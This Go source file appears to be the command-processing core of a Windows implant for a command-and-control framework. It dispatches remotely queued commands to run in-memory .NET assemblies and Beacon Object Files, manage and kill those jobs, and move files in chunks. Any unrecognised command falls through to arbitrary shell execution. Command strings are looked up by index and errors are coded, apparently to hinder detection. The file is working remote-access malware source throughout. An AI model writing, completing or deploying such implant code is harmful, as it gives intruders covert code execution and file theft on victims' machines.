// server/docker/payloads/Windows/command_processor.go

//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"

	//"os"
	"strings"
	"time"
)

// processNextCommand processes the next command in the queue
func (cq *WorkQueue) processNextCommand() (*OpResult, error) {
	cq.mu.Lock()
	if len(cq.commands) == 0 {
		cq.mu.Unlock()
		return nil, nil
	}

	cmd := cq.commands[0]
	cq.commands = cq.commands[1:]
	cq.mu.Unlock()

	// Add this diagnostic
	//if strings.Contains(fmt.Sprintf("%v", cmd), "command_id") {
	//	fmt.Fprintf(os.Stderr, "WARNING: Msg struct would print as: %v\n", cmd)
	//}

	// Set the current command in context
	cq.cmdContext.mu.Lock()
	cq.cmdContext.CurrentMsg = &cmd
	cq.cmdContext.mu.Unlock()

	// IMPORTANT: Apply session environment variables before executing any command
	cq.applySessionEnvironment()

	// Handle inline-assembly job management commands FIRST (by numeric ID)
	if cmd.CT == CmdInlineAssemblyJobs {
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobs]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &OpResult{
				Cmd:     cmd,
				EStr: Err(E19),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle inline-assembly-jobs-clean command
	if cmd.CT == CmdInlineAssemblyJobsClean {
		parts := strings.Fields(cmd.Cmd)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsClean]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-jobs-stats command
	if cmd.CT == CmdInlineAssemblyJobsStats {
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsStats]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-output command WITH arguments
	if cmd.CT == CmdInlineAssemblyOutput {
		parts := strings.Fields(cmd.Cmd)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyOutput]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-kill command WITH arguments
	if cmd.CT == CmdInlineAssemblyKill {
		parts := strings.Fields(cmd.Cmd)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyKill]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly commands WITH data (actual assembly execution)
	if (cmd.CT == CmdInlineAssembly || cmd.CT == CmdInlineAssemblyAsync) && cmd.Data != "" {
		var testParse map[string]interface{}
		_ = json.Unmarshal([]byte(cmd.Data), &testParse)

		handlerID := cmd.CT
		if handler, exists := cq.cmdHandlers[handlerID]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &OpResult{
				Cmd:     cmd,
				EStr: Err(E19),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle async BOF commands WITH data
	if cmd.CT == CmdBofAsync && cmd.Data != "" {
		result := cq.processBOFAsync(cmd)
		return &result, nil
	}

	// Handle regular BOF commands WITH data
	if cmd.CT == CmdBof && cmd.Data != "" {
		result := cq.processBOF(cmd)
		return &result, nil
	}

	// Handle upload chunks
	if cmd.CT == CmdUpload && cmd.Data != "" {
		result, err := HandleUploadChunk(cmd, cq.cmdContext)
		if err != nil {
			return &OpResult{
				Cmd:     cmd,
				Error:       err,
				EStr: err.Error(),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}
		return result, nil
	}

	// Handle download continuation
	if cmd.Filename != "" && cmd.CurrentChunk > 0 {

		cq.mu.Lock()
		downloadInfo, exists := cq.activeDownloads[cmd.Filename]
		cq.mu.Unlock()

		if !exists {
			return &OpResult{
				Cmd:     cmd,
				Error:       fmt.Errorf("%s", Err(E4)),
				EStr: Err(E4),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}

		if !downloadInfo.InProgress {
			return &OpResult{
				Cmd:     cmd,
				Error:       fmt.Errorf("%s", Err(E4)),
				EStr: Err(E4),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}

		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
		if err != nil {
			return &OpResult{
				Cmd:     cmd,
				Error:       err,
				EStr: err.Error(),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}

		cq.updateDownloadProgress(cmd.Filename, cmd.CurrentChunk)

		return result, nil
	}

	// Parse command for everything else
	var cmdArgs []string

	// For BOF commands and variants, handle them specially (by numeric ID)
	if cmd.CT == CmdBof || cmd.CT == CmdBofAsync ||
		cmd.CT == CmdBofJobs || cmd.CT == CmdBofOutput || cmd.CT == CmdBofKill {
		parts := strings.Fields(cmd.Cmd)
		if len(parts) > 1 {
			cmdArgs = parts[1:]
		}
	} else {
		// Normal command processing
		// Special handling for download and upload commands to preserve spaces in file paths
		var args []string
		cmdLower := strings.ToLower(strings.TrimSpace(cmd.Cmd))

		if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdDownload)) {
			// Use special parsing for download that treats everything after "download" as one argument
			args = parseDownloadCommand(cmd.Cmd)
		} else if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdUpload)) {
			// Use special parsing for upload that treats everything after "upload" as one argument
			args = parseUploadCommand(cmd.Cmd)
		} else {
			// Use improved general parser for all other commands
			args = parseCommandLine(cmd.Cmd)
		}

		if len(args) == 0 {
			return &OpResult{
				Cmd:     cmd,
				Error:       fmt.Errorf("%s", Err(E1)),
				EStr: Err(E1),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}
		cmdArgs = args[1:]
	}

	// Look up command handler by numeric ID
	if handler, exists := cq.cmdHandlers[cmd.CT]; exists {
		result := handler(cq.cmdContext, cmdArgs)

		// For file operations (download/upload), preserve the data from the handler
		if (cmd.CT == CmdDownload || cmd.CT == CmdUpload) &&
			(result.Cmd.Filename != "" || result.Cmd.Data != "") {
			// The handler set file operation data, merge with original command metadata
			result.Cmd.CID = cmd.CID
			result.Cmd.DID = cmd.DID
			result.Cmd.AID = cmd.AID
			result.Cmd.Timestamp = cmd.Timestamp
			// Keep the file data from the handler (Filename, CurrentChunk, TotalChunks, Data)
		} else {
			// For non-file operations, use the original command
			result.Cmd = cmd
		}

		result.Done = time.Now().Format(time.RFC3339)
		return &result, nil
	}

	// If no handler found (CT == CmdUnknown or unregistered), try shell command
	output, err := executeShellCommand(cmd.Cmd)
	if err != nil {
		return &OpResult{
			Cmd:     cmd,
			Output:      output,
			Error:       err,
			EStr: err.Error(),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}, nil
	}

	return &OpResult{
		Cmd:     cmd,
		Output:      output,
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}, nil
}
